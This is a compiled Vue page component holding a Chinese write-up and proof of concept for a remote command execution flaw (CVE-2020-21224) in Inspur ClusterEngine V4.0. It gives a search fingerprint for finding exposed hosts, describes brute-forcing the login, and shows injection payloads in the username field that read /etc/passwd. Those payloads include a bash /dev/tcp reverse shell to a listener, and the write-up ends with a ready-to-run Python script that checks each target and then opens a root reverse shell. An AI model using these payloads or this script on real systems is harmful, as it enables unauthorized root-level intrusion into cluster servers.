import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>浪潮服务器群集管理系统存在危险字符未过滤，导致远程命令执行</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>浪潮ClusterEngineV4.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;TSCEV4.0&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091847442.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>由于登录页面没有发现验证码，进行账号爆破</p><p>当burpsuite爆破完成时，注意到POST数据中如果带有 ;&#39; ，响应数据包发生异常。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091847752.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过响应包信息，猜测可能存在一个远程执行代码漏洞，并将此数据包放在repeater中，我发现如果发布数据中有</p><p>一个 &#39; ，系统将抛出异常。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091847377.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091847382.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进一步测试时，我发现username参数或password任一参数如果包含 &#39; ，将引发此异常</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091847158.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>定尝试发送 &#39; &#39; 来查看响应包。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848777.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我注意到 grep 命令错误，服务端的代码可能是这样</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>var1 <span class="token operator">=</span> <span class="token variable"><span class="token variable">\`</span><span class="token function">grep</span> xxxx<span class="token variable">\`</span></span> 
var2 <span class="token operator">=</span> <span class="token variable"><span class="token variable">$(</span>python <span class="token parameter variable">-c</span> <span class="token string">&quot;from crypt import crypt;print crypt(&#39;<span class="token variable">$username</span>&#39;,&#39;<span class="token variable">$1</span><span class="token variable">$$</span>var1&#39;)&quot;</span><span class="token variable">)</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>尝试发送 -V 和 --help 来查看响应包，响应包证实了猜测</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848195.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848197.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>尝试读取 <strong>/etc/passswd</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848409.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>尝试列目录</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848084.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>确认存在一个远程执行命令执行漏洞，经过fuzz，得到以下payload</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848053.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848057.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹 shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token assign-left variable">op</span><span class="token operator">=</span>login<span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token number">1</span> <span class="token number">2</span><span class="token punctuation">\\</span>&#39;,<span class="token punctuation">\\</span>&#39;1<span class="token punctuation">\\</span>&#39;<span class="token punctuation">\\</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable"><span class="token variable">\`</span>bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261<span class="token variable">\`</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>payload发送后, 在 kali linux 服务器上获取了一个 root 权限的 shell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091848952.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上面是原文的测试思路，但经过重新测试之后发现还有另一种简单方法</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POC测试(出现 root:x:0:0 则存在漏洞)
op=login&amp;username=test\`$(cat /etc/passwd)\`

{&quot;err&quot;:&quot;/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n&quot;,&quot;exitcode&quot;:1,&quot;out&quot;:&quot;the user test does not exist\\nerror:1\\n&quot;}

反弹shell
op=login&amp;username=test\`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)\`
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091849501.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> re
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号  : PeiQi文库                                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: 浪潮ClusterEngineV4.0                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mIP          &gt;&gt;&gt; xxx.xxx.xxx.xxx:9999                              \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mPORT        &gt;&gt;&gt; 9999                                              \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/login&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token string">&quot;op=login&amp;username=test\`$(cat /etc/passwd)\`&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
        etc_passwd <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&#39;\\{&quot;err&quot;:&quot;/bin/sh: (.*?): No such&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&quot;root:x:0:0&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o]    目标 {} 可能存在漏洞, 响应为:{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> etc_passwd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标 {} 请求失败 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    IP <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35m请输入监听IP   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    PORT <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35m请输入监听PORT &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/login&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token string">&quot;op=login&amp;username=\`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\`&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标 {} 请求失败 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl    &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091849410.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,42),o=[e];function i(c,l){return s(),a("div",null,o)}const k=n(p,[["render",i],["__file","浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html.vue"]]);export{k as default};
